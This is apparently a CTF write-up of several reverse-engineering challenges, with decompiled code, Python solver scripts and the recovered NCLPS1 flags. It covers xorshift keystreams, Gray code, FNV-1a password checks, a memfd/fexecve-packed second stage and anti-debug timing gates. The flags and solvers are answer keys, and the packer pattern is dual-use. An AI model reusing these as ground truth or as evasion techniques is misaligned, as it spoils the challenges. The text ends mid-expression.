Sebuah layanan internal bernama rotator melakukan rotasi penanda (token) untuk penandatanganan webhook. Untuk menghindari downtime, proses mempertahankan dua slot memori dan berganti aktif–pasif saat rotasi berlangsung

#### Solution
```c
int main(void)

{
  long lVar1;
  uchar *puVar2;
  size_t __len;
  uint uVar3;
  int iVar4;
  size_t __len_00;
  long lVar5;
  byte bVar6;
  long in_FS_OFFSET;
  pthread_t t1;
  pthread_t t2;
  timespec ts;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  __len_00 = sysconf(0x1e);
  if ((long)__len_00 < 1) {
    __len_00 = 0x1000;
  }
  g_pagesz = __len_00;
  g_page[0] = mmap((void *)0x0,__len_00,3,0x22,-1,0);
  if (g_page[0] != (void *)0xffffffffffffffff) {
    g_slot[0] = (uchar *)((long)g_page[0] + 0x100);
    g_page[1] = mmap((void *)0x0,__len_00,3,0x22,-1,0);
    if (g_page[1] != (void *)0xffffffffffffffff) {
      g_slot[1] = (uchar *)((long)g_page[1] + 0x100);
      g_len = 0x6b;
      bVar6 = 0xc2;
      puVar2 = g_slot[g_active];
      ks_state = 0xc0ffee5;
      lVar5 = 0;
      while( true ) {
        uVar3 = ks_state ^ ks_state << 0xd;
        uVar3 = uVar3 >> 0x11 ^ uVar3;
        ks_state = uVar3 << 5 ^ uVar3;
        puVar2[lVar5] = (byte)ks_state ^ (byte)lVar5 ^ bVar6;
        if (lVar5 + 1 == 0x6b) break;
        bVar6 = blob[lVar5 + 1];
        lVar5 = lVar5 + 1;
      }
      mprotect(g_page[g_active],__len_00,1);
      iVar4 = pthread_create(&t1,(pthread_attr_t *)0x0,loader_th,(void *)0x0);
      if (iVar4 == 0) {
        iVar4 = pthread_create(&t2,(pthread_attr_t *)0x0,rotator_th,(void *)0x0);
        if (iVar4 == 0) {
          write(1,"[rotator] ready\n",0x10);
          ts.tv_sec = 0;
          ts.tv_nsec = 2000000000;
          nanosleep((timespec *)&ts,(timespec *)0x0);
          pthread_cancel(t1);
          pthread_cancel(t2);
          pthread_join(t1,(void **)0x0);
          pthread_join(t2,(void **)0x0);
          __len = g_pagesz;
          munmap(g_page[0],g_pagesz);
          munmap(g_page[1],__len);
          iVar4 = 0;
        }
        else {
          iVar4 = 1;
          perror("pthread_create rotator");
        }
      }
      else {
        iVar4 = 1;
        perror("pthread_create loader");
      }
      goto LAB_001013bb;
    }
  }
  iVar4 = 1;
  perror("mmap");
LAB_001013bb:
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return iVar4;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

The main function shows `mmap` alocation for some of page, global variable name `g_page` and `g_slot`, two functions as a thread worker. 

```c
      while( true ) {
        uVar3 = ks_state ^ ks_state << 0xd;
        uVar3 = uVar3 >> 0x11 ^ uVar3;
        ks_state = uVar3 << 5 ^ uVar3;
        puVar2[lVar5] = (byte)ks_state ^ (byte)lVar5 ^ bVar6;
        if (lVar5 + 1 == 0x6b) break;
        bVar6 = blob[lVar5 + 1];
        lVar5 = lVar5 + 1;
      }
```

In the main function, there is a loop that produces byte token usomh bitwise (shift/xor) and combine it with byte from an big array in the .rodata.

![alt text](/images/nclp/rotator/image.png)

On the **.rodata**. I found a long array byte (`blob`) that looks like used for key/seed because the the size is fit and there is XREF to the generator function. 

```c
void * loader_th(void *arg)

{
  uchar *puVar1;
  size_t sVar2;
  uint uVar3;
  size_t sVar4;
  byte bVar5;
  int iVar6;
  timespec ts;
  
  do {
    g_busy = 1;
    iVar6 = 1 - g_active;
    mprotect(g_page[iVar6],g_pagesz,3);
    sVar2 = g_len;
    ks_state = 0xc0ffee5;
    puVar1 = g_slot[iVar6];
    if (g_len != 0) {
      bVar5 = 0xc2;
      ks_state = 0xc0ffee5;
      sVar4 = 0;
      while( true ) {
        uVar3 = ks_state ^ ks_state << 0xd;
        uVar3 = uVar3 >> 0x11 ^ uVar3;
        ks_state = uVar3 << 5 ^ uVar3;
        puVar1[sVar4] = (byte)ks_state ^ (byte)sVar4 ^ bVar5;
        if (sVar2 == sVar4 + 1) break;
        bVar5 = blob[sVar4 + 1];
        sVar4 = sVar4 + 1;
      }
    }
    ts.tv_sec = 0;
    ts.tv_nsec = 30000000;
    nanosleep((timespec *)&ts,(timespec *)0x0);
    mprotect(g_page[iVar6],g_pagesz,1);
    ts.tv_sec = 0;
    ts.tv_nsec = 70000000;
    g_busy = 0;
    nanosleep((timespec *)&ts,(timespec *)0x0);
  } while( true );
}
```

Checking the XREF, It lead us to the token creation function (loader_th). And the flow is:
- a variable set to `0x0c0ffee5` (seed PRNG)
- iteration 0..N created `eax` value through `eax ^= eax << 13; eax ^= eax >> 17; eax = eax ^ (eax << 5)` operation
- every output byte = `(eax ^ i ^ blob[i_or_special_case]) & 0xff`

From here we can predict the token if we have `blob`.

Because the token is in the binary (readable in .rodata) and the algorithm can be predicted with constant seed. The exploit step:

1. Find offset `blob` in .rodata.
2. Copy PRNG generator and do `out[i] = (eax ^ i ^ blob_byte) & 0xff` for each i.
3. Decode to ASCII.

The implementation is the solver script:

```python
blob_hex = "c29d180f717b171f71be38983d16400cdeded64ad495a4e98f498a37202a51857e79c427b32dc0f233e5999b56c67219beddb32d1150f095e11018d1399f10c4049f2c44db0e3037a46a316dc3d01f6c8108ccc623b70e466930db58285d4f188cf13cb3c563935d33122900"
blob = bytes.fromhex(blob_hex)
assert len(blob) == 108

def recover(blob):
    out = []
    eax = 0x0c0ffee5
    for i in range(0x6b):
        esi = (0xffffffc2 & 0xffffffff) if i == 0 else blob[i]
        ecx = eax
        ecx = ((ecx << 13) & 0xffffffff) ^ ecx
        ecx = (ecx ^ (ecx >> 17)) & 0xffffffff
        eax = ((ecx << 5) & 0xffffffff) ^ ecx
        byte = (eax ^ i ^ esi) & 0xff
        out.append(byte)
    return bytes(out)

print(recover(blob).decode())
```

#### Flag
NCLPS1{pee_balap._k3ren_k4mu_b1s4_m3nYeL3s41kan_R4ce_c0nd1Tion_4tau_kAmu_DeCrYpt_buk4n_bypass?_770c130987}

### rusybyte

#### Description
Apakah kalian pikir reverse chall hanya berupa c code? Bagaimana dengan chall sederhana ini, hope you find how the code is work :D

#### Solution
The main function: 

```llvm
@alloc_27e20ab4610c44e7cd1ed777571a5eaa = private unnamed_addr constant [4 x i8] c"flag", align 1
```

1. Program open literal file labeled `"flag"`, 

```llvm
; call std::fs::File::open
  %1 = call { i64, ptr } @_ZN3std2fs4File4open17hd6ef4275f7c3f694E(ptr align 1 @alloc_27e20ab4610c44e7cd1ed777571a5eaa, i64 4)
; invoke <std::fs::File as std::io::Read>::read_to_string
  %16 = invoke { i64, ptr } @...Read$GT$14read_to_string...
```

2. Read the content as `String`, 

```llvm
; invoke hex::encode
  invoke void @_ZN3hex6encode17h04af9b7614623139E(...)
; invoke core::iter::traits::iterator::Iterator::step_by
  invoke void @_ZN4core4iter6traits8iterator8Iterator7step_by17h643e416d973a3425E(..., i64 2)
```

3. Process hex pair from the string to byte vector, 

```llvm
; invoke <alloc::string::String as core::ops::index::Index<I>>::index
  %67 = invoke { i1, i8 } @core::num::<impl u8>::from_str_radix(..., i32 16)
; invoke alloc::vec::Vec<T,A>::push
  invoke void @_ZN5alloc3vec16Vec$LT$T$C$A$GT$4push17h442119782527e08dE(ptr align 8 %bytes_as_number, i8 %number,...)
```

4. Combine that byte to some big number (BigUint, big‑endian), 

```llvm
; invoke num_bigint::biguint::BigUint::from_bytes_be
  invoke void @_ZN10num_bigint7biguint7BigUint13from_bytes_be17h46da48b7b7a716f9E(...)
; invoke num_bigint::biguint::shift::<impl core::ops::bit::Shr<i32> ...>::shr
  invoke void ...Shr$LT$i32$GT... (ptr align 8 %big_int, i32 1)
; invoke num_bigint::biguint::...BitXor...
  invoke void ...bitxor...(ptr align 8 %gray, ptr align 8 %big_int, ptr align 8 %_52)
```

5. Then calculate `g = n ^ (n >> 1)` and print `g` as a decimal. The output is in the `output.txt` :

```
14752413339507261788089274160981710388034751813474093911954931340700920522403115209264370445883623831619
```

With this solver script we can reverse the process and retrieve the flag:

```python
def gray_to_binary(g: int) -> int:
    b = 0
    while g:
        b ^= g
        g >>= 1
    return b

def int_to_bytes_be(x: int) -> bytes:
    length = (x.bit_length() + 7) // 8
    return x.to_bytes(length, 'big') if length else b"\x00"

val = 14752413339507261788089274160981710388034751813474093911954931340700920522403115209264370445883623831619
n = gray_to_binary(val)
data = int_to_bytes_be(n)
print(data.decode())
```

#### Flag
NCLPS1{rust_code_is_faster_than_go_code_:P}

### Sentinels

#### Description
An urgent, encrypted brief arrives from a trusted contact inside the research collective known as “Sentinels,” explaining that the network’s automated gatekeeper—powered by a compact executable that enforces the Sentinel authentication routine—has begun denying even authorized maintenance traffic, and unless someone off-site can quickly dissect the program, understand how the Sentinel validates visitors, and devise a discreet workaround, the team risks being locked out during an impending solar-storm blackout that would leave critical systems untended.

#### Solution
```c
undefined8 main(undefined8 param_1,undefined8 param_2,char **param_3)
{
  int iVar1;
  void *__buf;
  long lVar2;
  size_t sVar3;
  long in_FS_OFFSET;
  size_t local_50;
  char *local_48;
  undefined8 local_40;
  long local_30;
  
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  __buf = malloc(0x3f60);
  if (__buf == (void *)0x0) {
    perror("malloc");
  }
  else {
    local_50 = 0x3f60;
    iVar1 = uncompress(__buf,&local_50,packed_data,0xbd6);
    if (iVar1 == 0) {
      lVar2 = syscall(0x13f,"sentinel",1);
      iVar1 = (int)lVar2;
      if (iVar1 < 0) {
        perror("memfd_create");
      }
      else {
        sVar3 = write(iVar1,__buf,local_50);
        if (sVar3 == local_50) {
          local_48 = "sentinel";
          local_40 = 0;
          fexecve(iVar1,&local_48,param_3);
          perror("fexecve");
        }
        else {
          perror("write");
        }
      }
    }
    else {
      fwrite("[-] zlib inflate failed\n",1,0x18,stderr);
    }
  }
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 1;
  }
  __stack_chk_fail();
}
```

Program decompress blob (`uncompress`) to buffer, create memfd, write the result to memfd, and run ELF from the result via `fexecve`. In others word, we should extract the second ELF for further analysis.

![alt text](/images/nclp/sentinelz/image.png)

From the output of `readelf -S sentinelz`, section `.rodata` is in the `0x2000` with offset `0x2000`. 

![alt text](/images/nclp/sentinelz/image-1.png)

`packed_data` in the `0x2060` with length `0xBD6` (3030 byte). file offset extraction:

```bash
dd if=sentinelz bs=1 skip=8288 count=3030 of=packed.zlib
```

```python
import zlib, pathlib
c = pathlib.Path('packed.zlib').read_bytes()
stage2 = zlib.decompress(c)
print("decompressed size:", len(stage2))
pathlib.Path('stage2.elf').write_bytes(stage2)
print("validate header:", stage2[:4])
```

The output `packed.zlib` the decompressed with code above to get the `stage2.elf`.

**Analisis stage‑2 di Ghidra**

```c
undefined8 main(void)

{
  uint uVar1;
  char *pcVar2;
  size_t sVar3;
  char *pcVar4;
  ulong uVar5;
  undefined8 uVar6;
  byte bVar7;
  long lVar8;
  char *__s;
  ulong uVar9;
  undefined1 *puVar10;
  long in_FS_OFFSET;
  byte bVar11;
  undefined1 local_168 [16];
  undefined1 local_158 [48];
  undefined1 local_128 [16];
  undefined1 local_118 [16];
  undefined1 local_108 [16];
  undefined1 local_f8 [16];
  undefined1 local_e8 [16];
  undefined1 local_d8 [16];
  undefined1 local_c8 [16];
  undefined1 local_b8 [16];
  undefined1 local_a8 [16];
  undefined1 local_98 [16];
  undefined1 local_88 [16];
  undefined1 local_78 [16];
  undefined1 local_68 [16];
  undefined1 local_58 [16];
  undefined1 local_48 [16];
  undefined1 local_38 [16];
  long local_20;
  
  bVar11 = 0;
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_128 = (undefined1  [16])0x0;
  __s = local_128;
  local_118 = (undefined1  [16])0x0;
  local_108 = (undefined1  [16])0x0;
  local_f8 = (undefined1  [16])0x0;
  local_e8 = (undefined1  [16])0x0;
  local_d8 = (undefined1  [16])0x0;
  local_c8 = (undefined1  [16])0x0;
  local_b8 = (undefined1  [16])0x0;
  local_a8 = (undefined1  [16])0x0;
  local_98 = (undefined1  [16])0x0;
  local_88 = (undefined1  [16])0x0;
  local_78 = (undefined1  [16])0x0;
  local_68 = (undefined1  [16])0x0;
  local_58 = (undefined1  [16])0x0;
  local_48 = (undefined1  [16])0x0;
  local_38 = (undefined1  [16])0x0;
  puts("== Sentinel Access Control ==");
  __printf_chk(1,"Password : ");
  pcVar2 = fgets(__s,0x80,stdin);
  if (pcVar2 != (char *)0x0) {
    pcVar2 = local_a8;
    sVar3 = strcspn(__s,"
");
    local_128[sVar3] = 0;
    __printf_chk(1,"Key      : ");
    pcVar4 = fgets(pcVar2,0x80,stdin);
    if (pcVar4 != (char *)0x0) {
      sVar3 = strcspn(pcVar2,"
");
      local_a8[sVar3] = 0;
      if (local_128[0] != 0) {
        uVar9 = 0xcbf29ce484222325;
        bVar7 = local_128[0];
        do {
          uVar5 = (ulong)bVar7;
          bVar7 = __s[1];
          __s = __s + 1;
          uVar5 = uVar5 ^ uVar9;
          uVar9 = uVar5 * 0x100000001b3;
        } while (bVar7 != 0);
        if ((uVar5 == 0x11d5438a8ef24722) && (local_a8[0] != 0)) {
          uVar9 = 0xcbf29ce484222325;
          bVar7 = local_a8[0];
          do {
            uVar5 = (ulong)bVar7;
            bVar7 = pcVar2[1];
            pcVar2 = pcVar2 + 1;
            uVar5 = uVar5 ^ uVar9;
            uVar9 = uVar5 * 0x100000001b3;
          } while (bVar7 != 0);
          if (uVar5 == 0x9ba9f4c0a1f2b4b6) {
            puVar10 = local_158;
            for (lVar8 = 0x2d; lVar8 != 0; lVar8 = lVar8 + -1) {
              *puVar10 = 0;
              puVar10 = puVar10 + (ulong)bVar11 * -2 + 1;
            }
            local_168 = (undefined1  [16])0x0;
            uVar1 = 0xcac7cf84;
            lVar8 = 0;
            do {
              uVar1 = uVar1 << 0xd ^ uVar1;
              uVar1 = uVar1 ^ uVar1 >> 0x11;
              uVar1 = uVar1 << 5 ^ uVar1;
              local_168[lVar8] = obf_flag[lVar8] ^ (byte)uVar1;
              lVar8 = lVar8 + 1;
            } while (lVar8 != 0x3c);
            puts("Welcome, Sentinel.");
            __printf_chk(1,"Flag: %s
",local_168);
            uVar6 = 0;
            goto LAB_00101350;
          }
        }
      }
      puts("Access denied.");
    }
  }
  uVar6 = 1;
LAB_00101350:
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar6;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Decompile the stage2 there is implementation of FNV‑1a (loop XOR + multiply 0x100000001b3) for Password and Key, then deobfuscate loop xorshift32 (shift/xor operation according to the order) that fill the buffer `local_168` from `obf_flag` using `0xCAC7CF84` seed, and `obf_flag` array in the `.rodata`

This is the dump of `obf_flag` (address `.rodata` in the stage2: `0x00102080`)

```
b1 cd 4b 2c 85 fe fd e2 76 42 c5 8f f5 35 5b ef
72 1b 5a ba 50 91 e5 e1 7d d0 86 38 de 6e ef e2
d2 ad ab 13 e4 bb d6 3c a8 b7 2f d3 9b 25 2e b0
57 47 b9 b4 5a 46 04 3a 62 52 fd d2
```

With that we can directly deobfuscate with this solver script:

```python
import struct

SEED = 0xCAC7CF84
OBF_ADDR = 0x2080
OBF_LEN  = 0x3C

stage2 = open('stage2.elf','rb').read()

RO_VADDR = 0x2000
RO_FILEOFF = 0x2000
obf_off = OBF_ADDR - RO_VADDR + RO_FILEOFF
obf = stage2[obf_off:obf_off+OBF_LEN]

def xs32(x):
    x &= 0xffffffff
    x ^= (x << 13) & 0xffffffff
    x ^= (x >> 17) & 0xffffffff
    x ^= (x << 5) & 0xffffffff
    return x & 0xffffffff

x = SEED
out = bytearray()
for b in obf:
    x = xs32(x)
    out.append(b ^ (x & 0xff))

print(out.decode())
```

#### Flag
NCLPS1{w3lcOme_s3ntinel_go0dd_tO_s3e_yo0uu_ag41n_485eb2be91}

### Spikey

#### Description
You are hired as a security consultant to audit “Spikey”, the control module on a prototype research drone. It's discovered that there's a logic bomb in its firmware: the drone will only unlock if given eight passwords at precise time intervals - and it will detect the debugger. Your mission: reverse-engineer and disable the logic bomb to get the mission access code without triggering the “explosion”.

#### Solution
```c
__time64_t t = _time64(NULL);
srand((uint)t);
if (!IsDebuggerPresent()) {
    double tol[8]  = {0.05,0.02,0.05,0.02,0.1,0.02,0.05,0.02};
    double goal[8] = {0.5,0.1,0.9,0.2,1.0,0.15,0.85,0.3}; // disimpan pada indeks 8..15
    double t0 = nowSec();
    char codes[8][16];
    for (int i=0;i<8;i++) {
        printf("Code %d: ", i+1); fflush(stdout);
        if (scanf("%15s", codes[i]) != 1) return 1;
        double t1 = nowSec();
        double dt = t1 - t0;
        if (dt < goal[i]-tol[i] || dt > goal[i]+tol[i]) { puts("Miscalibrated"); return 1; }
        t0 = t1; jitter();
    }
    if (isRabbitHole((long long)codes) == 0) {
        for (int i=0;i<8;i++) {
            char *p = (char*)recoverPart(i);
            if (strcmp(codes[i], p) != 0) { puts("Integrity breach"); free(p); return 1; }
            free(p);
        }
        void *flag = recoverFlag();
        printf("Flag: %s\n", flag);
        free(flag);
    } else {
        void *boom = recoverBoom();
        printf("Flag: %s\n", boom);
        free(boom);
    }
}
```

main function shows: anti‑debug, timing gate for eight input, and the flow of flag recovering. Program prompt eight times `Code 1..8`, check the time gap between input and target and per-index toleration. If out of range, shows `Miscalibrated` and terminated. After all of the input is accepted, branching path according `isRabbitHole()`. If `isRabbitHole(...) == 0`, every input verified with `recoverPart(i)`. If all of it valid, program calls `recoverFlag()` and print `Flag: ...`. If not, it print `recoverBoom()` (decoy).

```c
void* recoverFlag(void) {
    void *buf = malloc(0x4F);
    if (!buf) exit(1);
    for (unsigned long i=0; i<0x4E; i++) { // 78 byte
        ((unsigned char*)buf)[i] = revOp(((unsigned char*)&mystBlockF)[i], (int)i);
    }
    ((unsigned char*)buf)[0x4E] = 0; // NUL
    return buf;
}
```

**mystBlockF (78 byte, alamat mulai 0x1400050A0):**

```
46 83 15 56 df 99 e4 b5 2f 26 da 6b 03 d7 8e 75 b5 f0 b3 bb a0 21 b4 c0 9f 86 17 4a 56 51 9b 8f b2 6a 86 d2 1e 97 31 78 13 b7 c3 98 48 79 6e f5 af 34 1a b4 4e 43 8c 49 bc 2b c9 83 2f 1d bf e1 e1 33 6d de fa 3d 4e 44 ee f6 86 27 28 37
```

We can know that `recoverFlag()` not depends with input and time. This function reads global blob `mystBlockF` along **78 byte** and decode every byte with reverese transformation `revOp(b, idx)`, then add NUL terminator.

```c
byte revOp(byte b, int idx) {
    int k = (idx * 3 + 5) % 8; if (k == 0) k = 1; // k ∈ {1..7}
    unsigned int r = ror8(~b, (byte)k);
    return ( (char)r + 0xA6U ) ^ ((unsigned char*)&helperKey)[idx % 5];
}

unsigned int ror8(byte x, byte s) {
    return ((unsigned int)x << ((8 - s) & 0x1F)) | (((unsigned int)x) >> (s & 0x1F));
}
```

**helperKey (5 byte, the address starts at 0x140005120):**

```
3d a7 4f 1c e5
```

Transformation happens in `revOp`. byte obfuscated reversed (NOT), rotated (ROR) in 8 bit with total rotation that lowered from the index, in the offset with `+0xA6`, then XOR with repeated key 5‑byte `helperKey`.

Because `revOp` only depends with `(b, idx)` argument and `helperKey` table, then the flag can be retrieve staticly without validating the timing gate or through `isRabbitHole()`. The implementation is `revOp` every byte `mystBlockF[i]` with `i` index from 0 to 77 for the flag. Here is the implementation of it in the solver script.

```python
mystBlockF = bytes([
    0x46,0x83,0x15,0x56,0xDF,0x99,0xE4,0xB5,0x2F,0x26,0xDA,0x6B,0x03,0xD7,0x8E,0x75,
    0xB5,0xF0,0xB3,0xBB,0xA0,0x21,0xB4,0xC0,0x9F,0x86,0x17,0x4A,0x56,0x51,0x9B,0x8F,
    0xB2,0x6A,0x86,0xD2,0x1E,0x97,0x31,0x78,0x13,0xB7,0xC3,0x98,0x48,0x79,0x6E,0xF5,
    0xAF,0x34,0x1A,0xB4,0x4E,0x43,0x8C,0x49,0xBC,0x2B,0xC9,0x83,0x2F,0x1D,0xBF,0xE1,
    0xE1,0x33,0x6D,0xDE,0xFA,0x3D,0x4E,0x44,0xEE,0xF6,0x86,0x27,0x28,0x37
])

helperKey = bytes([0x3D, 0xA7, 0x4F, 0x1C, 0xE5])

def ror8(x, s):
    s &= 7
    return ((x >> s) | ((x << (8 - s)) & 0xFF)) & 0xFF

def revOp(b, idx):
    k = (idx * 3 + 5) % 8
    if k == 0:
        k = 1
    r = ror8((~b) & 0xFF, k)
    return ((r + 0xA6) & 0xFF) ^ helperKey[idx % 5]

out = bytearray()
for i, bb in enumerate(mystBlockF[:78]):
    out.append(revOp(bb, i))

flag = out.decode('utf-8', errors='strict')
print(flag)
```

#### Flag
NCLPS1{w0ww_k4mu_b3Rh4siL_d3fuSe_l0g1c_b0mb_d3ng4n_t1ming_pr3si1s1_e4743a6046}

### Telemetry

#### Description
CLI kecil untuk memvalidasi dan men-trace sebuah “session tag” yang digunakan modul telemetry internal. Mendukung mode verbose untuk membantu penelusuran jalur proses byte-per-byte. Dirancang untuk berjalan di Linux x86_64 (release build)

#### Solution

```c
undefined8 main(int argc, char **argv) {
    // ... parsing -v/--verbose, --check <tag>, NCL_TRACE
    i64 meta[5] = {0};
    if (!parse_flag_format(tag, &meta[0], &meta[1])) { fprintf(stderr, "invalid format\n"); return 1; }

    size_t n = strlen(tag);
    void *buf = malloc(n);
    meta[2] = 0;
    transform_pipeline(tag, n, buf, &meta[2], verbose);
    if (meta[2] == 0x36 && constant_time_eq(buf, (void*)0x102080, 0x36)) {
        puts("session tag accepted");
        return 0;
    }
    puts("session tag rejected");
    return 1;
}
```

The binary reading "session tag" input from `--check <tag>`. Env variable `NCL_TRACE` or `-v/--verbose` option turning hexdump every step of transformation. The main flow is:

1. Validate the first format through `parse_flag_format(tag, ...)`.
2. Run `transform_pipeline(tag, len, out, &out_len, verbose)` - len-preserving.
3. If `out_len == 0x36 (54)` and `constant_time_eq(out, kTarget@.rodata, 54)` valid, tag accepted.

```c
  iVar5 = constant_time_eq(__ptr,&kTarget,0x36);
  if (iVar5 != 0) {
    puts("session tag accepted");
    free(__ptr);
    uVar3 = 0;
    goto LAB_00101386;
```

**kTarget (54 byte, address starts in 0x102080):**

```
00 3c f0 9d f7 bc 3b ca 97 46 8d e4 e6 6f 64 fd ca 9d 13 c8 a2 91 02 b2 43 31 aa 00 18 c0 47 82 75 c6 fe 37 5c e6 e1 6f b1 d6 ac 67 f1 41 5b d8 dd 97 e6 f3 0f
```

In the `main`, compare it with the result of transform with `kTarget` blob in the `.rodata`.

```c
void transform_pipeline(void *in, size_t n, void *out, size_t *out_n, int verbose) {
    uint8_t *d = malloc(n); memcpy(d, in, n);
    // stage1_xor_key
    uint8_t b = 0xD8; for (size_t i=0;i<n;i++){ d[i]^=b; if(i+1<n) b = kKey[(i+1)&0xF]; }
    // stage2_addpos
    uint8_t acc=0; for (size_t i=0;i<n;i++){ acc+=7; d[i] = d[i] + acc + 3; }
    // stage3_rol (rotasi dihitung dari i menggunakan magic multiply /5)
    for (size_t i=0;i<n;i++){ uint8_t r = rot_count(i); d[i] = rol8(d[i], r); }
    // stage4_xor_idx
    for (size_t i=0;i<n;i++){ d[i] ^= (uint8_t)(i ^ 0xA5); }
    // stage5_swappairs
    for (size_t i=0;i+1<n;i+=2){ uint8_t t=d[i]; d[i]=d[i+1]; d[i+1]=t; }
    memcpy(out, d, n); *out_n = n; free(d);
}
```

**kKey (address starts in 0x102130):**

```
d8 0b 31 e2 e1 00 fc 46 71 1d 4e 24 37 0e 54 10
```

16 byte key for XOR int the `kKey` **`0x102130`**. The verification is bytewise tranformation chain that can be reversed. The transformation step is:

1. stage1_xor_key: `dst[0] ^= 0xD8;` and for `i≥1`: `dst[i] ^= kKey[i & 0xF]`.
2. stage2_addpos: `dst[i] = dst[i] + (3 + 7*i) (mod 256)`.
3. stage3_rol: `dst[i] = rol8(dst[i], b(i))`, with rotate calculation:
   `hi = ((i * 0xCCCCCCCCCCCCCCCD) >> 64) & 0xFF;`
   `b(i) = ( i - (( (hi & 0xFC) + (i/5) ) & 0xFF) ) & 7`
4. stage4_xor_idx: `dst[i] ^= (i ^ 0xA5)`.
5. stage5_swappairs: switch `(0,1), (2,3), ...`.

Every step is implemented as inverse with, swap -> XOR -> ROR -> subtract -> Key XOR. With that we can write this solver script:

```python
from typing import List

kTarget = bytes.fromhex(
    "00 3c f0 9d f7 bc 3b ca 97 46 8d e4 e6 6f 64 fd"
    " ca 9d 13 c8 a2 91 02 b2 43 31 aa 00 18 c0 47 82"
    " 75 c6 fe 37 5c e6 e1 6f b1 d6 ac 67 f1 41 5b d8"
    " dd 97 e6 f3 0f 5a".replace("\n", " ")
)

kKey = bytes.fromhex("d8 0b 31 e2 e1 00 fc 46 71 1d 4e 24 37 0e 54 10")

M = 0xCCCCCCCCCCCCCCCD

def ror8(x: int, r: int) -> int:
    r &= 7
    return ((x >> r) | ((x << (8 - r)) & 0xFF)) & 0xFF

def rot_count(i: int) -> int:
    hi = ((i * M) >> 64) & 0xFF
    return ((i & 0xFF) - (((hi & 0xFC) + ((i // 5) & 0xFF)) & 0xFF)) & 7

def invert(target: bytes) -> bytes:
    n = len(target)
    buf = bytearray(target)
    # inv stage5: swap
    for i in range(0, n - 1, 2):
        buf[i], buf[i+1] = buf[i+1], buf[i]
    # inv stage4: XOR (i ^ 0xA5)
    for i in range(n):
        buf[i] ^= (i ^ 0xA5) & 0xFF
    # inv stage3: ROR by rot_count(i)
    for i in range(n):
        buf[i] = ror8(buf[i], rot_count(i))
    # inv stage2: subtract (3 + 7*i)
    for i in range(n):
        buf[i] = (buf[i] - (3 + 7*i)) & 0xFF
    # inv stage1: XOR keystream
    for i in range(n):
        k = 0xD8 if i == 0 else kKey[i & 0xF]
        buf[i] ^= k
    return bytes(buf)

flag = invert(kTarget)
print(flag.decode('utf-8', errors='replace'))
```

#### Flag
NCLPS1{t3lLemeTry._0ps_4lPha_2025_+bU1ld1a_0b5085122b}

### Tilde

#### Description
Javascript dengan kegilaannya, chall ini adalah contohnya. Sebuah char tilde bisa digunakan untuk melakukan obfuscate.

#### Solution
```js
const flag = "NCLPS1{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}";
if (flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~[]) == 